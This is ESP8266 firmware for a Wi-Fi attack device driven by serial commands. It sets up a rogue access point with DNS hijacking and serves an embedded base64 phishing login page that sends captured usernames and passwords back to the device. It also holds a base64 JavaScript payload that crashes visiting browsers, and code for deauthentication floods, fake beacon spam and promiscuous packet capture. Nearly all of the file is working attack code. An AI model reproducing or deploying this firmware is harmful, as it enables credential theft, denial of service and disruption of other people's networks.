// SPIFFS

#include <FS.h> // Include the SPIFFS library
#include <string>
#include <stdio.h>
#include <ArduinoJson.h> //install arduinojson by NOT the official arduino people
#include <stdlib.h>
#include "base64.hpp"
#include <ESP8266WiFi.h>
#include "./DNSServer.h"
#include <ESP8266WebServer.h>
#include <string.h>
#include <Arduino.h>
#include "PCAP.h"

#define CHANNEL 1
#define BAUD_RATE 230400
#define CHANNEL_HOPPING true //if true it will scan on all channels
#define MAX_CHANNEL 11 //(only necessary if channelHopping is true)
#define HOP_INTERVAL 214 //in ms (only necessary if channelHopping is true)

char hostname[128];

char ssid[32];
char dns_filter[25];
char html_text[4096];

const char *CRASH_BYTES = "CjxzY3JpcHQ+CiAgICAhKChCUyk9Pnt2YXIgRT1gYT1bXTtmb3IoOzspe2EucHVzaChbJHtCU30sYS5wb3AoKV0pfWAsQz1gZGF0YTp0ZXh0L2h0bWw7YmFzZTY0LCR7YnRvYShFKX1gLFA9YGZvcig7Oyl7bmV3IFdvcmtlcigiJHtDfSIpfWAsQ0M9YGRhdGE6dGV4dC9odG1sO2Jhc2U2NCwke2J0b2EoUCl9YDtuZXcgV29ya2VyKENDKTt9KSgiQXJyYXkoNjAwKS5tYXAoXz0+U3RyaW5nLmZyb21DaGFyQ29kZSgweEZGRkYpLnJlcGVhdCgweDFGRkZGRkU4KSkiKTsgLy9vcmlnaW5hbCBjcmVkaXQgZm9yIHRoaXMgY3Jhc2ggZ29lcyB0byAweDE1MAo8L3NjcmlwdD4=";
const char *PHISHER = "PGh0bWw+CiAgICA8aGVhZD4KCiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8aDE+TG9nIEluPC9oMT4KICAgICAgICA8cD5Vc2VybmFtZTo8L3A+PGlucHV0IGlkPSJ1bmFtZSI+CiAgICAgICAgPHA+UGFzc3dvcmQ6PC9wPjxpbnB1dCBpZD0icHciPjxicj48YnI+CiAgICAgICAgPGJ1dHRvbiBvbmNsaWNrPSJzdWJtaXQoKSI+U2lnbiBJbjwvYnV0dG9uPgogICAgPC9ib2R5PgogICAgPHNjcmlwdD4KICAgICAgICBmdW5jdGlvbiBzdWJtaXQoKXsKICAgICAgICAgICAgbGV0IHVzZXJuYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVuYW1lIikudmFsdWU7CiAgICAgICAgICAgIGxldCBwYXNzd29yZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwdyIpLnZhbHVlOwoKICAgICAgICAgICAgZmV0Y2goImh0dHA6Ly8xMC4xMC4xMC4xL2xfamxvZ2luZm8/dXNlcm5hbWU9IiArIHVzZXJuYW1lICsgIiZwYXNzd29yZD0iICsgcGFzc3dvcmQsIHt9KTsKICAgICAgICB9CiAgICA8L3NjcmlwdD4KPC9odG1sPg==";

ESP8266WebServer server(80);


const byte DNS_PORT = 53; 
IPAddress apIP(10, 10, 10, 1);
DNSServer dnsServer;


const uint8_t channels[] = {1, 6, 11};
// run-time variables
char emptySSID[32];
uint8_t channelIndex = 0;
uint8_t macAddr[] = {100, 112, 148, 109, 56, 18};
uint8_t wifi_channel = 1;
uint32_t currentTime = 0;
uint32_t packetSize = 0;
uint32_t packetCounter = 0;
uint32_t attackTime = 0;
uint32_t packetRateTime = 0;


uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

uint8_t d_packet[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};
uint8_t targ[6];

char **ssids;
int ssid_amount;

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// Shift out channels one by one
void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex > sizeof(channels)) channelIndex = 0;

    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      wifi_set_channel(wifi_channel);
    }
  }
}

// beacon frame definition
uint8_t beaconPacket[109] = {
  /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,             // Type/Subtype: managment beacon frame
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

  // Fixed parameters
  /* 22 - 23 */ 0x00, 0x00,                         // Fragment & sequence number (will be done by the SDK)
  /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
  /* 32 - 33 */ 0xe8, 0x03,                         // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
  /* 34 - 35 */ 0x31, 0x00,                         // capabilities Tnformation

  // Tagged parameters

  // SSID parameters
  /* 36 - 37 */ 0x00, 0x20,                         // Tag: Set SSID length, Tag length: 32
  /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,                           // SSID

  // Supported Rates
  /* 70 - 71 */ 0x01, 0x08,                         // Tag: Supported Rates, Tag length: 8
  /* 72 */ 0x82,                    // 1(B)
  /* 73 */ 0x84,                    // 2(B)
  /* 74 */ 0x8b,                    // 5.5(B)
  /* 75 */ 0x96,                    // 11(B)
  /* 76 */ 0x24,                    // 18
  /* 77 */ 0x30,                    // 24
  /* 78 */ 0x48,                    // 36
  /* 79 */ 0x6c,                    // 54

  // Current Channel
  /* 80 - 81 */ 0x03, 0x01,         // Channel set, length
  /* 82 */      0x01,               // Current Channel

  // RSN information
  /*  83 -  84 */ 0x30, 0x18,
  /*  85 -  86 */ 0x01, 0x00,
  /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
  /*  91 -  92 */ 0x02, 0x00,
  /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
  /* 101 - 102 */ 0x01, 0x00,
  /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
  /* 107 - 108 */ 0x00, 0x00
};

bool isnewline(int chr){
  if(chr == '\n'){
    return true;
  }else{
    return false;
  }
}


static int delimit(char *args, char **argv)
{
   int count = 0;
   while (isnewline(*args)) ++args;
   while (*args) {
     if (argv) argv[count] = args;
     while (*args && !isnewline(*args)) ++args;
     if (argv && *args) *args++ = '\0';
     while (isnewline(*args)) ++args;
     count++;
   }
   return count;
}

char **newlineparse(char *args, int *argc)
{
   char **argv = NULL;
   int    argn = 0;
   if (args && *args
    && (args = strdup(args))
    && (argn = delimit(args,NULL))
    && (argv = (char**)malloc((argn+1) * sizeof(char *)))) {
      *argv++ = args;
      argn = delimit(args,argv);
   }
   if (args && !argv) free(args);
   *argc = argn;
   return argv;
}

static int setargs(char *args, char **argv)
{
   int count = 0;
   while (isspace(*args)) ++args;
   while (*args) {
     if (argv) argv[count] = args;
     while (*args && !isspace(*args)) ++args;
     if (argv && *args) *args++ = '\0';
     while (isspace(*args)) ++args;
     count++;
   }
   return count;
}

char **parsedargs(char *args, int *argc)
{
   char **argv = NULL;
   int    argn = 0;
   if (args && *args
    && (args = strdup(args))
    && (argn = setargs(args,NULL))
    && (argv = (char**)malloc((argn+1) * sizeof(char *)))) {
      *argv++ = args;
      argn = setargs(args,argv);
   }
   if (args && !argv) free(args);
   *argc = argn;
   return argv;
}

void charEndSequence(){
  Serial.print("root@");
  Serial.print(hostname);
  Serial.print("~");
}

void setup() {
	Serial.begin(115200);
  Serial.println("\n[OK] Successfully setup Serial");
	Serial.println("[...] Setting up Spiffs");
  if(!SPIFFS.begin()){
    Serial.println("[Error] Cannot setup spiffs");
  }
  Serial.println("[OK] Successfully setup Spiffs");

  Serial.println("[...] Loading Config");
  File config = SPIFFS.open("/config.txt", "r");
  if(!config){
    Serial.println("[Warning] No config file was present");
    File confwr = SPIFFS.open("/config.txt", "w+");
    confwr.print("{\n\"hostname\":\"ESPTAP\"\n}");
    confwr.close();
    Serial.println("[OK] Created Config File on first boot");
    Serial.println("[OK] Hostname set to ESPTAP");
    ESP.restart();
    Serial.println("[ERROR] uh oh, somehow the ESP could not restart, please press the reset button!");
  }else{
    size_t config_size = config.size();
    Serial.print("Loaded Config With Size ");
    Serial.println(config_size);
    if(config_size > 1024){
      Serial.println("[Warning] Config size is over 1KB you will most likely encounter unexpected behaviour!");
    }
    std::unique_ptr<char[]> buf(new char[config_size]);
    config.readBytes(buf.get(), config_size);
    Serial.println("[OK] Config Loaded");
    StaticJsonDocument<1024> l_conf;
    deserializeJson(l_conf, buf.get());
    strcpy(hostname, l_conf["hostname"]);
    Serial.print("[OK] hostname is ");
    Serial.print(hostname);
    Serial.println();
  }
  Serial.println("[...] Bringing Up Interpreter");
  Serial.println("[OK] Launch");
  charEndSequence();


  // create empty SSID
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';



  // set packetSize
  packetSize = sizeof(beaconPacket);
  beaconPacket[34] = 0x21;
  packetSize -= 26;

  // get time
  currentTime = millis();

  // Set to default WiFi channel
  wifi_set_channel(channels[0]);
}

PCAP pcap = PCAP();
int ch = CHANNEL;
unsigned long lastChannelChange = 0;

void sniff_packet(uint8_t *packet, uint16_t len) {
  uint32_t timestamp = millis();
  uint32_t microseconds = (unsigned int)(micros() - millis() * 1000);
  pcap.newPacketSerial(timestamp, microseconds, len, packet); //log packets
}

bool spamming_beacons = false;
bool is_running = false;
bool logging_http = true;
bool is_pcap = false;
bool deauthing = false;

struct station_info *stat_info;
struct ip_addr *IPaddress;
IPAddress address;

String peter_griffin_lowercase(int i) {
    String bs = WiFi.BSSIDstr(i);
    bs.toLowerCase();
    return bs;
}

void handleCommand(char **args, int index){
  Serial.println();
  if(strcmp(args[0], "help") == 0){
    Serial.println("Here are all the commands available to you:");
    Serial.println("help");
    Serial.println("reboot"); 
    Serial.println("encode [text]");
    Serial.println("cat [file]");
    Serial.println("set-content [file] [text]");
    Serial.println("decode [text]");
    Serial.println("ls");
    Serial.println("rem [file]");
    Serial.println("spam-beacons [file]");
    Serial.println("stop-beacons");
    Serial.println("esptap-help");
    Serial.println("esptap [arguments]");
    Serial.println("pcap enable");
    Serial.println("pcap disable");
    Serial.println("network-scan");
    Serial.println("deauth [pow/disable] [ap-mac]");
  }else if(strcmp(args[0], "esptap-help") == 0){
    Serial.println("ESPTAP help:");
    Serial.println("esptap connected");
    Serial.println("esptap returns [base64-encoded-payload]");
    Serial.println("esptap run");
    Serial.println("esptap mode [crash-clients/steal-passwords/sniff-device-info]");
    Serial.println("esptap log-mode [all/http-only/dns-only/none]");
  }else if(strcmp(args[0], "reboot") == 0){
    Serial.println("[OK] Powering off...");
    ESP.restart();
  }else if(strcmp(args[0], "encode") == 0){
    char encoded[1024];
    char total_buf_in[1024];
    strcpy(total_buf_in, args[1]);
    strcat(total_buf_in, "");
    for(int i = 2; i < index; i++){
      strcat(total_buf_in, args[i]);
      strcat(total_buf_in, " ");
    }
    encode_base64((unsigned char *) total_buf_in, strlen(total_buf_in), (unsigned char *) encoded);
    Serial.print(encoded);
  }else if(strcmp(args[0], "set-content") == 0){
    char *file = (char *)malloc(sizeof(char) * strlen(args[1]) + 2);
    strcpy(file, "/");
    strcat(file, args[1]);
    char content[36864];

    decode_base64((unsigned char *)args[2], (unsigned char *) content);
    
    File confwr = SPIFFS.open(file, "w+");
    confwr.print(content);
    confwr.close();

    Serial.print("Wrote ");
    Serial.print(strlen(content) * 8);
    Serial.print(" bytes to ");
    Serial.println(file);
  }else if(strcmp(args[0], "decode") == 0){

  }else if(strcmp(args[0], "ls") == 0){
    Serial.println();
    Dir root = SPIFFS.openDir("/");
    uint8_t counter = 0;
    while(root.next()){
      counter++;
      Serial.println(root.fileName());
    }
    Serial.println();
    Serial.print("Root has ");
    Serial.print(counter);
    Serial.println(" files");
  }else if(strcmp(args[0], "esptap") == 0){
    if(index < 2){
      Serial.println("Not enough arguments provided, use ESPTAP help");
      return;
    }
    if(strcmp(args[1], "run") == 0){
      Serial.flush();
      Serial.print("SSID:");
      while(Serial.available() == 0){}
      strcpy(ssid, Serial.readStringUntil('\n').c_str());
      Serial.println(ssid);
      Serial.print("DNS-FILTER:");
      while(Serial.available() == 0){}
      strcpy(dns_filter, Serial.readStringUntil('\n').c_str());
      Serial.println(dns_filter);
      Serial.print("Website File:");
      char file[32];
      while(Serial.available() == 0){}
      strcpy(file, "/");
      strcat(file, Serial.readStringUntil('\n').c_str());
      Serial.println(file);
      File website = SPIFFS.open(file, "r");
      strcpy(html_text, "");
      while(website.available()){

        char i3c = (char)website.read();
        char tmpstr[2] = { i3c, '\0'};
        strcat(html_text, tmpstr);
      }
      Serial.println(html_text);
      Serial.println("Saving config to file ");
      Serial.print(ssid);
      Serial.println(".txt");

      char *config_fs = (char *)malloc(sizeof(char) * strlen(ssid) + 7);
      strcpy(config_fs, "/");
      strcat(config_fs, ssid);
      strcat(config_fs, ".txt");
      char config[512];
      strcpy(config, "{\"ssid\":\"");
      strcat(config, ssid);
      strcat(config, "\", \"dns_filter\":\"");
      strcat(config, dns_filter);
      strcat(config, "\"\"file\":\"");
      strcat(config, file);
      strcat(config, "\"}");

      File fs_conf = SPIFFS.open(config_fs, "w+");
      fs_conf.print(config);
      fs_conf.close();


      Serial.println("[...] Starting Server...");
      WiFi.mode(WIFI_AP);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
      WiFi.softAP(ssid);
      Serial.println("[OK] Network is up!");

      Serial.println("[...] Starting DNS server");
      dnsServer.start(DNS_PORT, dns_filter, apIP);
      Serial.println("[OK] DNS server online!");

      Serial.println("[...] Starting HTTP");
      server.on("/l_jloginfo", loginfo);
      server.onNotFound(http_handle);
      server.begin();
      Serial.println("[...] HTTP server started!");

      is_running = true;
    }else if(strcmp(args[1], "returns") == 0 ){
      decode_base64((unsigned char *) args[2], (unsigned char *)html_text);
      Serial.println("[OK] Updated Return payload");
    }else if(strcmp(args[1], "log-mode") == 0){
      if(strcmp(args[2], "all") == 0){
        dnsServer.setLoggingMode(true);
        logging_http = true;
      }else if(strcmp(args[2], "http-only") == 0){
        logging_http = true;
        dnsServer.setLoggingMode(false);
      }else if(strcmp(args[2], "dns-only") == 0){
        logging_http = false;
        dnsServer.setLoggingMode(true);
      }else if(strcmp(args[2], "none") == 0){
        logging_http = false;
        dnsServer.setLoggingMode(false);
      }
    }else if(strcmp(args[1], "connected") == 0){
      Serial.print("All Connected Clients:\r\n");
      stat_info = wifi_softap_get_station_info();
      int counter = 0;
      while (stat_info != NULL)
      {
        counter++;
        ipv4_addr *IPaddress = &stat_info->ip;
        address = IPaddress->addr;
        Serial.print("-----\nClient ");
        Serial.print(counter);
        Serial.print("\nMAC:");
        Serial.print(stat_info->bssid[0],HEX);
        Serial.print(stat_info->bssid[1],HEX);
        Serial.print(stat_info->bssid[2],HEX);
        Serial.print(stat_info->bssid[3],HEX);
        Serial.print(stat_info->bssid[4],HEX);
        Serial.print(stat_info->bssid[5],HEX);
        Serial.print("\nAPIP:");
        Serial.print(address);
        Serial.println("\r\n");
        stat_info = STAILQ_NEXT(stat_info, next);
      } 
    }else if(strcmp(args[1], "mode") == 0){
      if(strcmp(args[2], "crash-clients") == 0){
          decode_base64((unsigned char *) CRASH_BYTES, (unsigned char *)html_text);
          Serial.println("Set the server to crash mode!");
      }else if(strcmp(args[2], "steal-passwords")==0){
          decode_base64((unsigned char *) PHISHER, (unsigned char *)html_text);
          Serial.println("Set the server to steal-passwords mode!");
      }else if(strcmp(args[2], "sniff-device-info") == 0){

      }
    }
  }else if(strcmp(args[0], "rem") == 0){
    char *file = (char *)malloc(sizeof(char) * strlen(args[1]) + 2);
    strcpy(file, "/");
    strcat(file, args[1]);

    SPIFFS.remove(file);
  }else if(strcmp(args[0], "cat") == 0){
    char *file = (char *)malloc(sizeof(char) * strlen(args[1]) + 2);
    strcpy(file, "/");
    strcat(file, args[1]);

    Serial.print("Reading ");
    Serial.println(file);
    

    Serial.println("BEGIN FILE");

    File handle = SPIFFS.open(file, "r");
    while(handle.available()){
      Serial.write(handle.read());
    }

    Serial.println();
    Serial.print("END FILE");
  }else if(strcmp(args[0], "spam-beacons") == 0){

    WiFi.mode(WIFI_OFF);
    wifi_set_opmode(STATION_MODE);

    Serial.println("[...] Loading SSIDS");
    char *file = (char *)malloc(sizeof(char) * strlen(args[1]) + 2);
    strcpy(file, "/");
    strcat(file, args[1]);
    File ssid_handle = SPIFFS.open(file, "r");
    std::vector<String> ssid_buffer;
    int i = 0;
    while(ssid_handle.available()){
      String line = ssid_handle.readStringUntil('\n');
      ssid_buffer.push_back(line);
      Serial.print("Load SSID:");
      Serial.println(line);
      i++;
    }
    Serial.print("[OK] Read ");
    Serial.print(i);
    Serial.println(" SSIDS to memory");

    //load ssids into a c-string array

    ssids = (char **)malloc(sizeof(char *) * i);
    ssid_amount = i;

    for(int j = 0; j < i; j++){
      ssids[j] = (char *)malloc(sizeof(char) * (strlen(ssid_buffer[j].c_str()) + 1));
      strcpy(ssids[j], ssid_buffer[j].c_str());
    }

    spamming_beacons = true;
  }else if(strcmp(args[0], "stop-beacons") == 0){
    spamming_beacons = false;
    for(int i = 0; i < ssid_amount; i++){
      free(ssids[i]);
    }
    free(ssids);
  }else if(strcmp(args[0], "network-scan") == 0) {
    Serial.println("[...] Putting Down Reciever");
    WiFi.mode(WIFI_STA);
    Serial.println("[OK] Put down reciever");
    Serial.println("[...] Disconnecting Interface");
    WiFi.disconnect();
    Serial.println("[OK] Ready to scan!");
    delay(100);
    Serial.println("Scanning for networks!");
    int n = WiFi.scanNetworks();
    if(n == 0){
      Serial.println("Scan complete!");
      Serial.println("No Networks Discovered!");
    }else{
      Serial.println("Scan complete!");
      Serial.print(n);
      Serial.println(" networks found!");
      for(int i = 0; i < n; i++){
        Serial.println("---------------");
        Serial.print("#");
        Serial.println(i);
        Serial.print("SSID:");
        Serial.println(WiFi.SSID(i));
        Serial.print("RSSI:");
        Serial.println(WiFi.RSSI(i));
        Serial.print("BSSID:");
        Serial.println(WiFi.BSSIDstr(i));
        Serial.print("Channel:");
        Serial.println(WiFi.channel(i));
      }
    }
  }else if(strcmp(args[0], "deauth") == 0){
    if(strcmp(args[1], "pow") == 0){
      wifi_set_opmode(0x1);

      de_parseMac(args[2], targ);
      Serial.print("Deauth operation started for ");
      Serial.println(parseMac(targ));
      deauthing = true;
    }else if(strcmp(args[1], "disable") == 0){
      deauthing = false;
    }
  }else if(strcmp(args[0], "pcap") == 0){
    if(strcmp(args[1], "enable") == 0){
      Serial.println("[...] Starting PCAP");
      pcap.startSerial();
      Serial.println("[OK] Started PCAP");

      Serial.println("[...] Putting Down Reciever");
      WiFi.mode(WIFI_STA);
      Serial.println("[OK] Put down reciever");
      Serial.println("[...] Disconnecting Interface");
      WiFi.disconnect();
      Serial.println("[OK] Ready to scan!");
      delay(100);
      Serial.println("Scanning for networks!");
      int n = WiFi.scanNetworks();
      if(n == 0){
        Serial.println("Scan complete!");
        Serial.println("No Networks Discovered!");
      }else{
        Serial.println("Scan complete!");
        Serial.print(n);
        Serial.println(" networks found!");
        for(int i = 0; i < n; i++){
          //Serial.println("---------------");
          //Serial.print("#");
          //Serial.println(i);
          //Serial.print("SSID:");
          //Serial.println(WiFi.SSID(i));
          //Serial.print("RSSI:");
          //Serial.println(WiFi.RSSI(i));
          //Serial.print("BSSID:");
          //Serial.println(WiFi.BSSIDstr(i));
          //Serial.print("Channel:");
          //Serial.println(WiFi.channel(i));
          pcap.setup(WiFi.SSID(i).c_str(), peter_griffin_lowercase(i).c_str());
        }
      }


      Serial.println("[...] Setting up Network Chip");
      wifi_set_opmode(STATION_MODE);
      wifi_promiscuous_enable(0);
      WiFi.disconnect();
      wifi_set_promiscuous_rx_cb(sniff_packet);
      wifi_set_channel(ch);
      wifi_promiscuous_enable(1);
      Serial.println("[OK] Setup Network Chip");

      is_pcap = true;
    }else if(strcmp(args[1], "disable") == 0){
      Serial.println("[...] Setting up Network Chip");
      WiFi.disconnect();
      wifi_promiscuous_enable(0);
      Serial.println("[OK] Setup Network Chip");
      is_pcap = false;
    }
  }else{ 
    Serial.println("No such command found! type help to get a list of commands");
  }
}

void loginfo(){
  String ip = server.client().remoteIP().toString();
  if(server.args() > 0){
    String username = server.arg("username");
    String password = server.arg("password");
    Serial.println("Recieved new user credentials:\n----------");
    Serial.print("Username:"); 
    Serial.println(username);
    Serial.print("Password:");
    Serial.println(password);
    Serial.print("----------\n");
  }
}

void http_handle(){
  String ip = server.client().remoteIP().toString();
  if(logging_http){
    if(server.args() > 0){
      String payload = "{\n";
      //construct fake json payload, probably a better way to do this yeah?
      for(int arg = 0; arg < server.args(); arg++){
        payload += "\t" + server.argName(arg) + ":" + server.arg(server.argName(arg)) + "\n";
      }
      payload += "}";
      Serial.println(ip + ": POST http://" + server.hostHeader() + server.uri() + "\n" + payload);
    }else{ 
      Serial.println(ip + ": GET http://" + server.hostHeader() + server.uri());
    }
  }
  server.send(200, "text/html", html_text);
}

char *parseMac(uint8_t *mac){
  char* macStr = (char *)malloc(sizeof(char) * 17);
  memset(macStr, '\0', sizeof(char) * 17);

  sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

  return macStr;
}

void de_parseMac(const char* macStr, uint8_t* mac) {
    char* token = strtok((char*)macStr, ":");
    for (int i = 0; i < 6; i++) {
        mac[i] = strtol(token, NULL, 16);
        token = strtok(NULL, ":");
    }
}

uint16_t sq = 0;

void deauth_network(){
  uint16_t packsize = sizeof(d_packet);
  char *macstr = parseMac(targ);

  uint8_t reason = 1;

  memcpy(&d_packet[4], broadcast, 6);
  memcpy(&d_packet[10], targ, 6);
  memcpy(&d_packet[16], targ, 6);
  d_packet[24] = reason;
  d_packet[25] = 0x00;
  d_packet[0] = 0xc0;
  d_packet[22] = sq % 0xFF;
  d_packet[23] = sq / 0xFF;
  nextChannel();


  int send = wifi_send_pkt_freedom(d_packet, 26, 0);
  if(send == 0){
    Serial.print("Deauth -> ");
    Serial.println(macstr);
  }else{ 
    Serial.print("ERR -> ");
    Serial.println(send);
  }
  d_packet[0] = 0xa0;
  int send2 = wifi_send_pkt_freedom(d_packet, 26, 0);
  if(send2 == 0){
    Serial.print("Disassociate -> ");
    Serial.println(macstr);
  }else{ 
    Serial.print("ERR -> ");
    Serial.println(send2);
  }

  sq += 0x10;
  free(macstr);
}

void loop() {
  if(is_running){
    dnsServer.processNextRequest();
    server.handleClient();
  }
  if(Serial.available() > 0){
    char command[256];
    strcpy(command, Serial.readStringUntil('\n').c_str());
    Serial.print(command);

    char **args;
    int index;
    args = parsedargs(command, &index);

    handleCommand(args, index);

    Serial.println();
    charEndSequence();
  }
  if(is_pcap){
    if(CHANNEL_HOPPING){
      unsigned long currentTime = millis();
      if(currentTime - lastChannelChange >= HOP_INTERVAL){
        lastChannelChange = currentTime;
        ch++; //increase channel
        if(ch > MAX_CHANNEL) ch = 1;
        wifi_set_channel(ch); //switch to new channel
      }
    }
  }
  if(deauthing){
    deauth_network();
    delay(50);
  }
  if(spamming_beacons){
    currentTime = millis();

    if (currentTime - attackTime > 100) {
      Serial.print("Attacking:");
      Serial.println(packetCounter);
      attackTime = currentTime;

      // temp variables
      int i = 0;
      int ssidNum = 12;

      // Go to next channel
      nextChannel();

      while (i < ssid_amount) {
        char *ssid = ssids[i];

        int ssidLen = strlen(ssid);

        macAddr[5] = ssidNum;
        ssidNum++;

        // write MAC address into beacon frame
        memcpy(&beaconPacket[10], macAddr, 6);
        memcpy(&beaconPacket[16], macAddr, 6);

        // reset SSID
        memcpy(&beaconPacket[38], emptySSID, 32);

        // write new SSID into beacon frame
        memcpy(&beaconPacket[38], ssid, ssidLen + 1);

        // set channel for beacon frame
        beaconPacket[82] = wifi_channel;


        while (0 != wifi_send_pkt_freedom(beaconPacket, packetSize, 0)) {
          delay(1);
        }
        packetCounter++;
        i += 1;
      }
    }
  }
}